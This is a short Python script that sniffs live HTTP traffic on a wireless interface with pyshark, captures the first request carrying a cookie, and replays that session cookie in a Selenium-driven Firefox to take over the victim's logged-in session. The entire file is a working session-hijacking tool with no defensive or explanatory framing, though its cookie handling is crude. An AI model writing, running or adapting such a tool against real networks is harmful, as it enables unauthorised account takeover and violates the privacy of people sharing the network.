#!/usr/bin/python
import sys
from selenium import webdriver
from selenium.webdriver import Firefox
import pyshark

capture = pyshark.LiveCapture(interface='wlp3s0', display_filter='http')
for packet in capture.sniff_continuously():
    try:
      cookie_str = packet.http.cookie
      host_str = packet.http.request_full_uri
      #new_cookie = dict(item.split("=") for item in cookie_str.split(";"))
      new_cookie = {'name': '', 'value': cookie_str, 'path': '/'}
    except:
      continue
    driver = webdriver.Firefox()
    driver.get(host_str)
    driver.add_cookie(new_cookie)
    driver.refresh()
    sys.exit()
